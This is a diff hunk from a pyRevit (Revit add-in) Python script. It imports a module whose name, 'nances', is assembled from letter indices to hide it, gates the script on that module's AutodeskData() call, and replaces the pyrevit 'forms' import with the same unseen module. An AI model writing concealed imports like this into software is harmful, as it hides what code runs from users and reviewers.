@@ -10,7 +10,7 @@ ARC = string.ascii_lowercase
 begin = "".join(ARC[i] for i in [13, 0, 13, 2, 4, 18])
 module = importlib.import_module(str(begin))
 if module.AutodeskData():
-    from pyrevit import forms, script
+    from nances import forms
     uidoc = __revit__.ActiveUIDocument
     doc = uidoc.Document
     view = doc.ActiveView
